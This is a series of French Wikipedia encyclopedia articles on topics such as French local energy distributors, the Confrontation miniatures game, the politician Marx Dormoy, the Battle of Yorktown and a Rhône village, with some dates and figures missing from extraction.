Les entreprises locales de distribution d'électricité et de gaz ou ELD assurent en France la distribution, la fourniture voire la production d'électricité ou de gaz naturel sur leurs territoires. Les ELD ont pour mission de garantir l’accès au réseau de distribution et détiennent donc un monopole de la distribution sur leurs territoires historiques, au même titre qu’Enedis ou GRDF. Les ELD sont également fournisseurs historiques aux tarifs réglementés de vente (TRV) sur leurs territoires, et parfois fournisseurs en offre de marché.
Historique.
La loi de nationalisation de l’électricité et du gaz du qui avait modifié profondément l’organisation électrique et gazière française, avait cependant maintenu les droits des communes en matière de distribution publique de l’électricité et du gaz, hérités de la Loi de 1906.
Ainsi si la presque totalité des sociétés privées a bien été nationalisée, les entreprises publiques locales, qu'il s'agisse de régies ou de la Société d’intérêt collectif agricole d’électricité (SICAE), pouvaient poursuivre leur activité. Il n'était cependant plus possible pour les communes de créer ou reprendre cette activité, sous cette forme. Depuis 1987, la loi considère comme équivalente la gestion en société d'économie mixte (SEM). Ce qui a permis l'entrée d'acteurs privés au capital et dans l'exploitation de certaines de ces régies en particulier celles d'une taille importante et situées dans des zones profitables.
Depuis la loi du , créant en droit français la notion de gestionnaire du réseau de distribution (GRD), ces sociétés publiques locales se sont vu transférer les responsabilités afférentes, notamment la mission de garantir l'accès au réseau de distribution. En ce sens elles continuent à détenir le monopole de distribution sur leur territoire, que la loi du ne leur avait pas ôté.
Par ailleurs l'article 8 de la loi du maintenait pour ces sociétés la possibilité de continuer à produire de l’électricité, fréquemment en raison d'installations existantes (petites centrales hydroélectriques notamment). Toutefois, l'énergie produite ne pouvait servir qu'à l'autoconsommation ou être vendue à EDF.
Dans les faits, leur production est restée marginale, dans la mesure où aucune de ces régies n'avait la possibilité de développer des installations de grandes tailles en mesure de rivaliser économiquement avec celles d'EDF, rendant plus économique un approvisionnement auprès de cette dernière.
Avec la dérèglementation du secteur de l'électricité, certaines régies ont choisi d'intervenir sur le marché en cours de création en cherchant à développer des capacités de production ou d’approvisionnement.
Organisation du secteur.
Le nombre d'entreprises locales de distribution d'électricité et de gaz se montait, au , à 132 (110 purement électricité, 5 purement gaz, 17 mixtes électricité et gaz). Les ELD assurent 5 % de la distribution d’énergie électrique française dans communes. Créées par les collectivités locales, elles desservent environ 3,8 millions d’habitants et représentent emplois. La plupart d’entre elles sont fédérées dans des associations nationales, comme l'UNELEG (Union nationale des entreprises locales d'électricité et de gaz), la FNCCR (Fédération nationale des collectivités concédantes et régies), la FNSICAE (Fédération nationale des sociétés d'intérêt collectif agricole d'électricité), le SPEGNN (Syndicat professionnel des entreprises locales gazières) et ELE, syndicat professionnel des entreprises locales d'énergie.
Outre l'activité de gestion du réseau de distribution, la plupart des ELD sont également fournisseurs d'électricité et/ou de gaz. La loi du impose la séparation en 2 entités distinctes comptablement des activités de gestion du réseau et de fourniture d'électricité (ou de gaz), si l'ELD compte plus de 100 000 clients électricité (ou gaz). Les ELD de moindre taille peuvent maintenir les 2 activités dans la même entité.
Enfin, en cas de défaillance financière, technique ou encore en lien avec les difficultés liées à la gestion des entités de type TPE, sauf à s'allier à une ELD en meilleure santé et volontaire, EDF/Enedis est tenu de reprendre la distribution d'électricité comme ce fut le cas pour Électricité Service Gironde en 2000, ou plus récemment pour la régie de Cambounet sur le Sor (commune du département du Tarn).
Concurrence.
Alors qu'à la fin , les concurrents d'EDF fournissaient 18,9 % des foyers français (6,1 millions de sites résidentiels) en électricité, soit un gain de 1 point en un trimestre, les environ 130 ELD restent de fait en situation de quasi-monopole sur leur territoire. Selon le Médiateur de l'énergie et la CRE, les fournisseurs alternatifs n'ont que rarement investi ces zones pour proposer aux particuliers des offres de marché, estimant l'opération peu rentable en raison des coûts nécessaires pour adapter leur système d'information ; ils ne sont entrés sur le territoire des ELD que via le marché des entreprises, lorsque celles-ci leur demandent d'être présents sur tout le territoire. À l'inverse, certaines ELD se sont regroupées (Alterna, Proxelia) pour prospecter hors de leurs frontières, notamment dans le cadre des appels d'offres pour les entreprises et les collectivités.
Quelques ELD.
On retrouve environ 130 ELD sur l'ensemble du territoire français, avec une concentration marquée en Alsace-Moselle (héritage de l'organisation allemande de la distribution d'électricité et de gaz en régies locales), mais aussi dans les zones rurales et montagneuses où les communes ont pris le relais de l'initiative privée pour électrifier les campagnes :

</doc>
<doc id="248837" url="https://fr.wikipedia.org/wiki?curid=248837" title="Confrontation (jeu de figurines)">
Confrontation (jeu de figurines)

Confrontation est un système de jeu de figurines proposé par la société Rackham en 1996. Par extension, il concerne également la gamme de figurines commercialisées sous forme de blisters et de boites.
Historique du jeu.
Premières éditions chez Rackham.
Le jeu a connu quatre éditions différentes.
La première édition, publiée en février 1998, accompagne la sortie des premières figurines Rackham. Le jeu a été pensé à l'époque pour permettre aux joueurs d'utiliser les figurines en attendant la sortie de Rag'narok. Le système d'escarmouches, les règles gratuites et le concept des cartes de référence font mouche, et le jeu connaît un succès croissant. Le jeu utilise des cartes à fond blanc, et n'est plus pratiqué aujourd'hui.
La deuxième édition, publiée en 2001, a pour but principal d'harmoniser les profils et compétences de la première édition. Les règles, toujours livrées gratuitement dans les blisters de figurines, sont divisées en plusieurs livrets : "Confrontation" (règles de base), "Incantation" (magie), "Divination" (prêtrise), "Fortification" (machines de guerre) et "Incarnation" (règles d'expérience des Personnages, peu utilisées).
Cette deuxième édition donne véritablement ses lettres de noblesse au jeu, qui connaît alors un certain engouement de la part de la communauté de joueurs, avec l'organisation d'un grand nombre de tournois et manifestations. Le jeu utilise des cartes de référence à fond noir (pour le différencier de la première édition).
La troisième édition, publiée en 2005, améliore de nombreux points du système tout en conservant le principe des escarmouches. Le jeu devient plus fluide et plus rapide, notamment grâce à la diminution du nombre de phases de jeu. Auparavant gratuit, le jeu devient payant, sous forme d'un livre de règles. Deux extensions sont parues. La première, "Dogs of War", est un livre proposant aux joueurs de se constituer chacun une compagnie de mercenaires et de les faire évoluer au cours de missions. La seconde, "Confrontation 3.5", est une mise à jour des règles disponible gratuitement en ligne, qui modifie certaines Compétences, ainsi que les règles sur les mystiques et machines de guerre. Le jeu utilise les mêmes cartes que "Confrontation 2", en en supprimant une partie à l'aide de listes d'errata. "Confrontation 3"(et 3.5) sont encore pratiqués après la sortie de l'édition suivante par des joueurs qui souhaitent conserver le format d'escarmouche, celui-ci ayant disparu dans la .
En 2008, l'éditeur Rackham propose en ligne gratuitement les règles de Confrontation 3 et 3.5, ainsi que la quasi-totalité des cartes du jeu.
La quatrième édition, publiée en 2008, est nommée "Confrontation : l'Age du Rag'narok". Elle marque la fin de la distinction entre les systèmes de jeu "Confrontation" et Rag'narok. Là où "Confrontation" était un jeu d'escarmouches où chaque figurine pouvait agir indépendamment des autres, "Confrontation : l'Age du Rag'Narok" met en scène des unités. Cette édition change fondamentalement les mécanismes de jeu, pour se rapprocher de l'autre jeu de figurines de l'éditeur, "AT-43". La marque également le changement dans la production des figurines : auparavant en métal et non peintes, les figurines de "Confrontation" sont désormais en plastique, vendues assemblées et peintes. Les règles se présentent sous forme d'un livre. Chaque armée ou faction est ensuite détaillée dans un livre spécifique, baptisé "Army Book".
Vie du jeu après la disparition de Rackham.
La société Legacy Miniatures a acquis les droits sur tout le catalogue Confrontation et conçoit déjà des nouvelles figurines.
Depuis 2010, les joueurs de la Confédération du Dragon Rouge proposent la version "Conf'Fédé", une édition amateure de "Confrontation" basée sur les évolutions de la troisième édition et fruit d'un travail collectif et associatif. La communauté reste active, avec un forum dynamique et plusieurs tournois organisés chaque année en France.
La société éditrice du jeu fait faillite en 2010. L'ensemble des sites officiels est fermé. Le stock de figurines est alors repris par un site de commerce en ligne.
Tentative de reprise de la franchise par Sans-Détour.
En , les Éditions Sans-Détour, un éditeur français de jeux de rôle sur table et de jeux de société, publie un communiqué annonçant la reprise du jeu "Confrontation" dans le courant de l'année sous la forme de "Confrontation : Résurrection", qui se déroule dans l'univers d'Aarklash après le Rag'narok, mais dans la continuité du travail effectué sur les jeux précédents. Un jeu d'escarmouche et un jeu de plateau sont annoncés. Sans-Détour rachète les droits sur l'univers d'Aarklash et les jeux "Confrontation", "Rag'Narok", "Hybrid" et le jeu de rôle "Cadwallon" par l'intermédiaire de sa société partenaire Stellar Licensing &amp; Consulting.
Une cinquième édition du jeu, intitulée "Confrontation Classic", est lancée par Sans-Détour par l'intermédiaire d'un financement participatif mené avec succès sur la plate-forme Kickstarter en avril-. "Confrontation Classic" reprend les figurines de l'ancienne gamme sous la forme d'une grosse boîte de base à laquelle les options de financement permettent d'ajouter des boîtes d'extension contenant des figurines supplémentaires. À la suite du succès de ce financement, Sans-Détour annonce plusieurs autres jeux avec lesquelles les figurines de "Confrontation Classic" seront compatibles : "Confrontation : Résurrection", une deuxième édition des jeux de plateau "Hybrid" et "La Cité des voleurs" ainsi qu'un jeu de rôle "Confrontation". L'éditeur indique également avoir l'intention d'ajouter au jeu le peuple des elfes Akkyshans qui n'avaient jamais vu le jour en raison de la disparition de Rackham.
Le projet ne voit cependant jamais le jour. Le , la société Sans-Détour est mise en liquidation judiciaire, ce qui provoque l'annulation de plusieurs projets de l'éditeur encore non livrés, dont "Confrontations – Classic : The Legendary Skirmish Game". Le , la direction centrale de la Police judiciaire publie un communiqué conformément à la réquisition judiciaire ouverte par la section F2 du Parquet de Paris, qui a ouvert une enquête préliminaire pour abus de confiance. La DCPJ invite toutes les personnes impliquées dans les projets "Confrontations – Classic : The Legendary Skirmish Game" et "Aventures Le Jeu" à remplir une lettre circulaire dans l'éventualité de déposer une plainte. Le communiqué informe aussi des modalités de se constituer partie civile.
La procédure pénale a abouti au renvoi de la société Sans-Détour devant le tribunal correctionnel de Paris.
Reprise de la propriété intellectuelle par Monolith Editions.
Le 11 Avril 2024, Monolith Editions annonce que le tribunal de commerce de Paris lui a assigné la propriété intellectuelle relative à l'ensemble des jeux et univers créés par Rackham, dont "Confrontation".
Univers du jeu.
Le jeu "Confrontation" permet de créer des affrontements dans le monde d'Aarklash, univers médiéval-fantastique, où plusieurs peuples s'affrontent à l'aube du Rag'Narok.
Les peuples sont regroupés en 3 "Alliances" différentes : 
En dehors de ces alliances se trouve l'armée de l'Immobilis (cité-franche de Cadwallon, avec ses guildes et ses fiefs), les royaumes Élémentaires et les plans Immortels.
Le système de jeu.
Principes généraux.
Les règles de "Confrontation" sont basées sur l'utilisation de dés à 6 faces, d'un mètre gradué en centimètres ainsi que de cartes représentant chaque figurine ou unité.
Dans chaque blister ou boîte, une carte comporte les caractéristiques de la (ou les) figurines. Comme dans tous les jeux de figurines, les caractéristiques représentent les aptitudes au combat, et la valeur de la figurine en nombre de "points d'armée".
Au début de chaque tour, chaque joueur classe les cartes de référence des combattants de son armée dans l'ordre qu'il souhaite, pour constituer une "pile d'activation". Les joueurs jouent alors une carte à tour de rôle, et activent les combattants qui y sont associés (on peut jouer plusieurs cartes de références en même temps grâce aux cartes de réserve).
Adaptation en jeu vidéo.
En 2011, lors du Salon E3 consacré aux jeux vidéo, la société française de jeu vidéo Cyanide, déjà connue pour son adaptation du jeu de plateau "Blood Bowl", a dévoilé une adaptation du jeu "Confrontation" sur PC. 

</doc>
<doc id="248838" url="https://fr.wikipedia.org/wiki?curid=248838" title="David Hassine">
David Hassine

Rabbi David Hassine (1722-1792) (Hassine, nom porté notamment au Maroc, désigne en arabe celui qui est beau, bon) est une des figures les plus connues de la poésie liturgique juive marocaine et ses "piyyoutim" ont été diffusés à travers le monde séfarade.
Originaire de Meknès, David Hassine est rabbin et poète. Il est considéré comme le plus grand des poètes juifs du Maroc. Il est l’auteur de "Tehila ledavid" (Hymne de David), un recueil de poèmes liturgiques et élégiaques qui inspira de nombreux chantres marocains, et de "Mekoman chel zebahim" (La place des sacrifices), une versification des rituels de l’abattage. Il est aussi l’auteur de nombreux commentaires bibliques non publiés.
Ressources.
"Tehila le David" : Film qui retrace les grands moments de la vie communautaire juive à Meknes au à travers les poèmes chantés par David Hassine. Réalisé en 1984 par Haim Shiran. Rabbi David Hassine est interprété par Zeev Revah

</doc>
<doc id="248840" url="https://fr.wikipedia.org/wiki?curid=248840" title="La Danse des canards">
La Danse des canards

La Danse des canards est une chanson composée par l'accordéoniste suisse Werner Thomas en 1957 sous le titre , plus tard réintitulée (littéralement « La danse des oiseaux »).
Histoire de la chanson.
"La Danse des canards" est le titre français d’une chanson composée par l'accordéoniste suisse Werner Thomas en 1957, alors qu’il travaille comme musicien de restaurant à Davos. Elle est appelée initialement ', plus tard réintitulée '. Elle évoque la chanson belge composée et écrite par Pharaon Stoquart en 1946, "La Danse du spirou", « spirou » étant le surnom donné à un autre animal, l'écureuil en wallon. Comme cette dernière, la chanson va se trouver associée progressivement à une danse, une sorte de mimique de canard.
En 1973, le patron du label de disques belge Intervox passe ses vacances de ski à Davos. Il rencontre Werner Thomas qui lui remet la musique de cette danse des canards qu’il a composée. Une version électronique, interprétée par un groupe inventé pour la circonstance, , Bobby Setter &amp; Co, sort dans les années 1970 sous le titre "Tchip-Tchip". C’est un premier succès.
Le titre connaît une nouvelle notoriété au début des années 1980. À l'époque, la version instrumentale connaît déjà un succès certain aux Pays-Bas. Lorsque l’accordéoniste Hector Delfosse interprète le morceau, il remarque que la salle se met à danser. Une gestuelle apparaît, qui se répand de public en public L’enthousiasme et l’accueil autour de ce titre est tel, qu'Hector Delfosse, avec son frère aîné Georges Delfosse (appelé Joec sur l'album), directeur artistique de la société de disque Fonior, propose à son producteur belge Marcel De Keukeleire d'en créer une version chantée. Des paroles sont imaginées, quatre couplets et un refrain. C’est Eric Genty (alias Guy de Paris sur l'album également), par ailleurs chanteur au sein de l'orchestre d'Hector Delfosse, qui imagine ces paroles. La chanson, interprétée par J. J. Lionel, est enregistrée au Studio DES de Pol Clark, rue aux Fleurs à Bruxelles, avec l'ingénieur du son Francis De Well. La chanson sort en 1981 et doit son succès non seulement à la mélodie, aux paroles simples, voire enfantines, mais aussi à la chorégraphie associée et à la gestuelle appropriée. 
La version interprétée par J. J. Lionel devient la chanson francophone la plus vendue en France dans les années 1980. Elle figure dans le livre Guinness des records de 1983 avec vendus. Trente ans après la parution de la chanson, le score monte à .
En 1982, une version québécoise est enregistrée par Nathalie Simard. Son album du même nom remporte en 1983 le Félix de l'album le plus vendu cette année-là.
La musique figure également dans le film "Elle et lui" (1991), de Ken Kwapis, lors de la scène de mariage d'Olaf, ainsi que dans l'épisode 3 de la saison 5 du sitcom "The Big Bang Theory", où Leonard est le cavalier d'Amy à un mariage.
Une nouvelle version techno est apparue en 2007, ' par DJ Birdy, puis ' par Gordon Limit (disques de l'Arbre Sec) en 2008.

</doc>
<doc id="248841" url="https://fr.wikipedia.org/wiki?curid=248841" title="Marx Dormoy">
Marx Dormoy

Marx Dormoy, né le à Montluçon et mort assassiné le à Montélimar, est un résistant, et homme politique socialiste français.
Membre de la Section française de l'Internationale ouvrière (SFIO), il est notamment président du conseil général de l'Allier de 1931 à 1933, sous-secrétaire d'État à la présidence du Conseil de juin à novembre 1936 et ministre de l'Intérieur de novembre 1936 à janvier 1938, puis à nouveau en mars-avril 1938.
Biographie.
Jeunesse.
Selon son acte de naissance, René Marx Dormoy est né rue de la Paix à Montluçon, un quartier populaire. Il est le cadet des enfants de Jean Dormoy, alors cordonnier, en outre militant socialiste, qui sera maire de Montluçon de 1892 à 1898, et de Marie Joséphine Gavignon. Son prénom est une référence à Karl Marx. Lui et sa sœur aînée Jeanne, née le à Montluçon, connaissent une enfance défavorisée. René Marx a seulement onze ans lorsque son père meurt.
Pendant son service militaire, René Marx Dormoy est affecté en Algérie française, où il fonde un groupe de Jeunesses socialistes. À son retour, il est employé de mairie à Montluçon puis devient représentant de commerce. Il a 25 ans lorsqu'éclate la Première Guerre mondiale, pendant laquelle il s'illustre au combat. Rendu à la vie civile, il réintègre son poste de représentant de commerce, puis devient négociant en charbons.
Élu socialiste.
En novembre 1919, il mène la liste SFIO aux élections législatives, qui n'obtient aucun élu malgré un nombre élevé de voix ( sur exprimés). Un mois plus tard, il devient conseiller d'arrondissement. En 1920, il choisit le camp de Léon Blum, contre l'adhésion à la III Internationale.
Quatre ans plus tard, il devient secrétaire général de la fédération de l’Allier et parvient à maintenir une bonne implantation de celle-ci chez les ouvriers, malgré la concurrence du Parti communiste et la tentation de se tourner vers les ruraux, très majoritaires dans le département. Il entre ensuite à la Commission administrative permanente. En 1925, il est élu conseiller municipal et conseiller général du canton de Montluçon-Est, puis maire de la commune. En , il est élu président du conseil général de l'Allier, à la suite de la mort de Paul Constans, à qui il a succédé à la mairie six ans plus tôt, dont il récupère aussi le siège de député un mois plus tard. Georges Rougeron sera son secrétaire à partir d'.
Favorable à une participation de la SFIO dans un gouvernement à direction radicale, il refuse de suivre Marcel Déat, dont il juge les idées « aberrantes », et mène la manifestation du dans sa commune, où les communistes sont présents. Il est cependant à noter que, dans le journal "Combat social", il écrira des lignes le posant comme un partisan des idées des néosocialistes, même s'il préférait se référer à Pierre Renaudel qu'à Adrien Marquet. Il écrit en effet, comme Renaudel, que, « face au capitalisme impuissant à contrôler les forces aveugles qu'il a déchaînées », doit se dresser un socialisme qui ne peut s'exercer que sur un plan national. Rejetant le fascisme et la « violence des dictateurs », il se place malgré tout du côté des néosocialistes qui « défendent l'ordre contre le désordre du capitalisme », qui sont « pour la démocratie organisée et le socialisme pour le salut de la nation », « pour la nation et la solidarité internationale et pour la paix ».
Il est dès lors partisan d'une solution de Front populaire et d'une unité de candidature avec les communistes dès le premier tour, sans oublier pour autant les critiques qu'il formule contre ce mouvement avant 1934.
Ministre du Front populaire.
Réélu député lors des élections législatives de 1936, il est sous-secrétaire d’État à la présidence du Conseil au côté de François de Tessan et participe à la négociation des accords de Matignon. Après le suicide de Roger Salengro, il devient ministre de l’Intérieur, poste qu'il conserve dans le troisième cabinet de Camille Chautemps de à et dans le second cabinet de Léon Blum, de mars à .
Comme l'indique André Touret dans sa biographie : Cette politique de compréhension et de bienveillance à l'égard des réfugiés étrangers en France lui vaut des attaques virulentes.
Toutefois, le , il écrit aux préfets : 
Il ordonne alors de . Il renouvelle cet ordre par une directive similaire le : Cette période coïncide aussi avec l'arrivée de réfugiés de la guerre d'Espagne. Dans une circulaire de , il demande à la police de redoubler de vigilance en interdisant les franchissements de la frontière espagnole, et décide de mettre en demeure les Espagnols présents en France, de quitter le territoire.
Les immigrants espagnols, principalement des familles de républicains, sont toutefois parqués dans des camps du Midi de la France, parfois créés à cette intention : camp de concentration d'Argelès-sur-Mer, camp de Gurs, camp du Vernet. Après l'assassinat de Marx Dormoy, Hans Vogel, président du Parti social-démocrate d'Allemagne réfugié à Londres, écrira le : 
Lors de la fusillade de Clichy du (réunion privée d'un parti de droite issu des Croix-de-feu, le Parti social français, et contre-manifestation de socialistes et communistes locaux avec intervention des forces de l'ordre), il est personnellement incriminé par les communistes qui mettent en cause la réaction des forces de l'ordre.
Il consacre principalement ses activités à la lutte contre la Cagoule, laquelle est démantelée à la fin de . Il n’a pas le temps de détruire complètement ses ramifications dans les milieux économiques, en particulier dans les grandes entreprises, comme L'Oréal, qui, selon les renseignements généraux et la police judiciaire, financent le mouvement terroriste.
Il démet Jacques Doriot de ses fonctions de maire PPF de Saint-Denis à la suite d'irrégularités dans la gestion municipale. Le , lors d'une séance particulièrement houleuse qui dégénère en bagarre il rétorque à un député breton antisémite : 
Après ses passages au gouvernement, il est élu au Sénat en 1939.
La guerre et assassinat.
En , Dormoy fait partie des 80 parlementaires refusant de voter les pleins pouvoirs au maréchal Pétain. Le , il est suspendu de ses fonctions de maire de Montluçon, puis emprisonné cinq jours plus tard. Il est déjà démis de son mandat de conseiller général le . Il est incarcéré à Pellevoisin, puis à Vals-les-Bains, avant d'être mis en résidence surveillée à Montélimar dans l'hôtel "Le Relais de l'Empereur".
Dans la nuit du au , il est assassiné : une bombe à retardement avait été placée sous son lit par Maurice Marbach, Yves Moynier et Horace Vaillant, anciens cagoulards (extrême droite), avec la complicité d'une comédienne, , qui sert d'« appât ». La mort de Vaillant à Nice avec deux complices, dans la nuit du au , par l'explosion d'une autre bombe destinée à un attentat antisémite, met les enquêteurs sur la piste.
Ludovic Guichard, Yves Moynier et Annie Mourraille sont arrêtés et emprisonnés, mais le débat reste ouvert sur l'identité des commanditaires : les cagoulards pour se venger du démantèlement de leur organisation, Jacques Doriot qui voue une haine tenace à l'égard de Dormoy ou les Allemands pour faire pression sur le maréchal Pétain. Les prévenus ne seront jamais jugés et seront libérés de la prison de Largentière, le , par des militaires allemands.
Le peintre Lucien Pénat, dont il était un ami intime, a fait plusieurs portraits de lui.
Hommages et postérité.
Inhumé discrètement à Montélimar, Marx Dormoy aura droit à des funérailles solennelles à Montluçon, le , sera cité à l'ordre de la Nation en 1946 et médaillé de la Résistance française avec rosette en 1947. Il est inhumé au cimetière Saint-Paul (cimetière de l'Ouest) de Montluçon dans la même tombe que son père.
De nombreux établissements scolaires et de nombreuses voies portent son nom en France (par exemple, une avenue à Montluçon, ainsi qu'une rue et une station de métro à Paris).

</doc>
<doc id="248844" url="https://fr.wikipedia.org/wiki?curid=248844" title="Bataille de Yorktown">
Bataille de Yorktown

La bataille de Yorktown se déroule en Virginie du 28 septembre au , lors de la guerre d'indépendance des États-Unis. Elle oppose les insurgés américains et leurs alliés français commandés par le comte de Rochambeau aux Britanniques commandés par "Lord" Cornwallis. Après 21 jours de combat, ce dernier se rend, avec le quart des forces britanniques engagées dans la guerre ; la bataille signe la défaite certaine de la Grande-Bretagne.
Contexte.
Lorsque les généraux Rochambeau et Washington se rencontrent à Wethersfield dans le Connecticut le pour décider de la stratégie à adopter face aux Britanniques, ils ont l'intention de marcher sur New York, occupée par hommes sous les ordres de "Sir" Henry Clinton, le plus haut gradé des commandants britanniques.
Pendant ce temps, l'information parvient au général La Fayette que "Lord" Cornwallis a pris position à Yorktown en Virginie près de la rivière York. Avant de se rabattre sur la bourgade virginienne, Cornwallis campait avec ses hommes dans les colonies du Sud. Il en occupait une bonne partie, mais fut obligé d'abandonner ses positions pour se ravitailler et permettre à ses soldats de reprendre des forces à Yorktown. Ceux-ci étaient très exposés à la malaria, qui joua un rôle important dans l'affaiblissement ultérieur de ses forces. De plus, ses effectifs avaient aussi fondu en raison de la campagne que Nathanael Greene avait menée sans relâche contre ses troupes depuis deux ans. Clinton souhaite aussi ce mouvement sur Yorktown afin que les troupes puissent faire corps avec la Royal Navy.
Rochambeau prend la décision de marcher sur Yorktown, contrairement à la décision précédente — prise en commun avec Washington — et sans le dire à ce dernier. Washington, ayant appris la position des Britanniques en juillet, accepte avec beaucoup de récriminations cette décision de mener les troupes françaises et américaines en Virginie, espérant que Cornwallis maintienne ses forces à Yorktown. Contrairement à ce qu'il affirmera plusieurs années plus tard, Washington n'a donc pas joué de rôle réel dans la définition de la stratégie autour de la bataille de Yorktown, celle-ci ayant été faite par les Français.
Concernant les opérations navales, l'espoir est à l'évidence aussi français, Washington a la confirmation, le 14 août, que l'amiral de Grasse, qui était jusqu'alors aux Antilles, mouillait désormais dans la baie de Chesapeake avec une puissante flotte de vingt-huit navires.
La bataille.
La bataille se déroule donc à Yorktown, colonie de Virginie assiégée depuis plusieurs semaines. D'un côté, on trouve commandés par "Lord" Charles Cornwallis, et de l'autre insurgés américains, les volontaires de La Fayette, menés par le colonel Armand, marquis de la Rouërie, et George Washington, ainsi que les du corps expéditionnaire français de Rochambeau ( au total).
La flotte française assure le blocus du port de Yorktown empêchant tout ravitaillement des Britanniques par la mer (bataille de la baie de Chesapeake), tandis que les troupes terrestres franco-américaines encerclent la ville.
Après avoir pris les redoutes et bastions qui devaient la défendre, l'armée franco-américaine assiège la ville. L'artillerie française montre son efficacité. C'est la première utilisation du nouveau type d'artillerie conçu par Gribeauval.
"Lord" Cornwallis se rend. Prétendant être malade, il envoie un de ses subordonnés remettre son épée aux vainqueurs. À Londres, la défaite provoqua le renvoi du cabinet de "Lord" North, qui fut remplacé par des whigs favorables à la paix.
Les Canadiens français à la bataille de Yorktown.
Plusieurs Canadiens français ont pris part à la bataille de Yorktown. Ainsi, par exemple, le major Clément Gosselin, Germain Dionne et plusieurs autres combattent avec La Fayette et Washington. La défaite britannique amène britanniques à se réfugier au Québec et en Nouvelle-Écosse, sur une population de . Ce sera la création du Canada anglais.
Louis-Philippe de Vaudreuil, petit-fils d'un gouverneur de Nouvelle-France probablement né en Nouvelle-France, est amiral dans la marine française à la bataille de la baie de Chesapeake devant Yorktown. Né à Québec, Jacques Bedout, lieutenant de frégate français (plus tard contre-amiral), est quant à lui sur la frégate "la Railleuse".

</doc>
<doc id="248846" url="https://fr.wikipedia.org/wiki?curid=248846" title="Agave angustifolia">
Agave angustifolia

Agave angustifolia est une petite espèce d"'Agave" en forme de boule. Elle est partie de la famille des "Agavaceae".
Elle est appelée choka baïonnette à La Réunion.

</doc>
<doc id="248847" url="https://fr.wikipedia.org/wiki?curid=248847" title="Basel">
Basel



</doc>
<doc id="248849" url="https://fr.wikipedia.org/wiki?curid=248849" title="Bide et Musique">
Bide et Musique

Bide et Musique (parfois abrégé B&amp;M) est une webradio associative française créée en 2000, ce qui en fait l'une des pionnières du paysage webradiophonique français. Son objet est la diffusion de "bides", selon une définition floue qui lui est propre : 
Contenu.
Bide et Musique est composée d'une radio en diffusion continue sur Internet en streaming (une seule chanson à la fois, pas de téléchargements), en stéréo ou mono au choix, et d'une grande base de données sur les titres et les interprètes, où les auditeurs peuvent laisser des commentaires.
La programmation est variée, et comporte essentiellement des chansons des années 1970 et 1980. On peut la répartir en différentes catégories :
La base de données de la radio, qui constitue également sa "playlist", est composées de plus de 17 000 titres, et de plus de 8 000 artistes. Parmi ceux-ci, Philippe Mordan, Michel Farinet, Daphnièle, Waylon, Rony Emanuel, Laurenda, Braque, Bernard Ischer ou Anne Léonard font partie des artistes passés d'un anonymat quasi total au statut d'icônes pour les auditeurs de Bide et Musique.
Le site web associé à la radio connaît une très vive activité, notamment dans un forum consacré à la recherche discographique, et à travers les commentaires des visiteurs sur les fiches des titres de la base de données. Le site reçoit régulièrement la visite d'artistes diffusés sur la radio et est devenu incontournable auprès des divers média dès lors qu'il s'agit de retrouver un morceau improbable ou oublié.
L'association.
La webradio étant gérée par des administrateurs bénévoles et ne diffusant aucune publicité audio, elle s'est organisée en structure associative (association loi de 1901) de façon à pouvoir réunir, via les cotisations des membres, les sommes suffisantes pour acquitter les droits de diffusion auxquels la radio et le site sont assujettis.
Elle organise également des soirées thématiques, avec des invités considérés comme prestigieux pour quiconque apprécie cette radio. Par exemple, Patrick Topaloff et Adonis ont participé à plusieurs reprises à ces soirées.
Des ventes de compilations originales, regroupant des morceaux de la webradio uniquement, sont aussi organisées.

</doc>
<doc id="248850" url="https://fr.wikipedia.org/wiki?curid=248850" title="Agave horrida">
Agave horrida

Agave horrida est une espèce de plante de la famille des "Agavaceae". 
Description.
Il mesure de 30 à de large et de 50 à de haut.
Liste de sous-espèces.
Selon :

</doc>
<doc id="248853" url="https://fr.wikipedia.org/wiki?curid=248853" title="Reflux gastro oesophagien">
Reflux gastro oesophagien



</doc>
<doc id="248854" url="https://fr.wikipedia.org/wiki?curid=248854" title="Lanersbach">
Lanersbach

Lanersbach est le chef-lieu de la commune autrichienne de Tux. Il est situé dans le Tyrol.
Géographie.
Lanersbach est située dans la vallée de Tux, aux pieds de majestueuses chaînes de montagnes, à quelques kilomètres du célèbre glacier d'Hintertux. Ce petit village propose un domaine skiable abordable du nom de Eggalm, si certains préféreront Hintertux, tous pourront profiter de cette station.

</doc>
<doc id="248855" url="https://fr.wikipedia.org/wiki?curid=248855" title="Saint-Laurent-d'Oingt">
Saint-Laurent-d'Oingt

Saint-Laurent-d'Oingt est une ancienne commune française située dans le département du Rhône en région Auvergne-Rhône-Alpes. Le , elle a fusionné avec les communes du Bois-d'Oingt et d'Oingt pour former la commune nouvelle de Val d'Oingt. 
Son territoire composé de la vallée de l'Azergues (affluent de la Saône) et de plusieurs vallons (ruisseaux) et collines présente un intérêt écologique (rivière à truite, tourbières, gîtes à chauve-souris) et agronomique (vignobles). Le village, rural, a une population relativement stable depuis deux siècles, et compte 834 habitants en 2014. Le tourisme est développé autour du village, qui présente également une vie locale (école, poste, épicerie, équipements culturels et sportifs).
Géographie.
Situé au nord-ouest du versant méridional des collines du Beaujolais, au cœur de la région des Pierres dorées, Saint-Laurent-d'Oingt est un petit village classé de 904 hectares à d'altitude, à de Lyon et de Villefranche-sur-Saône. Il dépend du canton du Bois-d’Oingt, à . 
Il est desservi par la D 385 (Route Buissonnière), qui passe dans la vallée et le relie à Létra et Chamelet au nord-ouest, Le Bois-d'Oingt au sud-est. L'aérodrome de Villefranche - Tarare est situé à proximité sur la commune de Frontenas. Le village a obtenu de nombreux prix (en 2010, deux fleurs au concours des villes fleuries). 
Liste des hameaux : 
Topographie.
Hormis l'excroissance du territoire au nord (Le Pinot) dont l'altitude monte à plus de (contreforts des crêts de Remont qui culminent à , sur la commune voisine de Ville-sur-Jarnioux), le territoire de Saint-Laurent-d'Oingt est constitué de vallons et collines. Ceux-ci sont situés entre 250 et d'altitude et orientés selon des axes nord-est / sud-ouest. Les vallons (ruisseau de Vervuis en limite nord-ouest, ruisseau de Tagnand, ruisseau de Fourcon) sont perpendiculaires à la vallée à fond plat de l'Azergues dans laquelle ils débouchent. Celle-ci descend en altitude de 272 à et constitue le point le plus bas de Saint-Laurent-d'Oingt. En limite sud-ouest, au-delà du creusement du lit de la rivière, les sols remontent jusqu'à (crêt des Femmes).
Géologie.
